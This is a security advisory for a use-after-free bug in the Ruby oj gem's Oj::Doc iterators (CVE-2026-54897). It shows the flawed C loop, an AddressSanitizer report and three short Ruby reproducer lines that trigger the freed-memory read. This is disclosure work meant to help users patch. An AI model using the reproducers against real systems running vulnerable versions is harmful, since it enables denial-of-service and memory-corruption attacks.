# [H] Oj: Use-After-Free in Oj::Doc Iterators via Reentrant Close

## Summary
Severity: High
Advisory: GHSA-9ppp-w3g4-fh4q
CVE: CVE-2026-54897
CWE: CWE-416
Ecosystem: RubyGems
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-9ppp-w3g4-fh4q
Type: github-advisory

## Affected
- RubyGems: `oj` — affected >=0 <3.17.3

## Details
### Summary

`Oj::Doc` iterators (`each_value`, `each_child`, `each_leaf`) are vulnerable to a heap use-after-free. When a Ruby block yielded during iteration calls `doc.close` or `d.close`, the document's heap memory is freed while the C iterator is still running. When control returns from the block, the iterator reads from the freed region, producing a use-after-free accessible from pure Ruby.

### Version

- **Software**: oj gem
- **Affected**: all versions with `ext/oj/fast.c`
- **Latest tested**: 3.17.1 (confirmed present)

### Details

The iterators in `ext/oj/fast.c` follow the pattern:

```c
// fast.c:1505 (doc_each_child)
static VALUE doc_each_child(VALUE self, ...) {
    ...
    while (cur != NULL) {
        rb_yield(...);       // ← Ruby block executes here
        cur = cur->next;     // ← cur is now freed if block called close()
    }
}
```

`rb_yield` can invoke arbitrary Ruby code, including calling `close()` on the `Doc` or any child node, which calls `ruby_sized_xfree` on the backing buffer. On return, the C code reads `cur->next` from the freed region. All three iterators are affected.

ASAN report (each_child variant):
```
==253632==ERROR: AddressSanitizer: heap-use-after-free on address 0x5210000bd080
READ of size 8 at 0x5210000bd080 thread T0
    #0 doc_each_child  /ext/oj/fast.c:1505
0x5210000bd080 is located 896 bytes inside of 4064-byte region [0x5210000bcd00, 0x5210000bdce0)
freed by thread T0 here:
    #0 free
    #1 ruby_sized_xfree  (libruby-3.3.so.3.3)
```

All three iterators trigger the same freed region (`fd` shadow bytes):
```
0x5210000bd080:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
```

### Reproduce

```ruby
require 'oj'
# each_child
Oj::Doc.open('[1,2]') { |doc| doc.each_child { |d| d.close } }
# each_value
Oj::Doc.open('[1,2]') { |doc| doc.each_value { |v| doc.close } }
# each_leaf
Oj::Doc.open('[1,[2]]') { |doc| doc.each_leaf { |d| d.close } }
```

## References
- https://github.com/ohler55/oj/security/advisories/GHSA-9ppp-w3g4-fh4q
- https://github.com/ohler55/oj
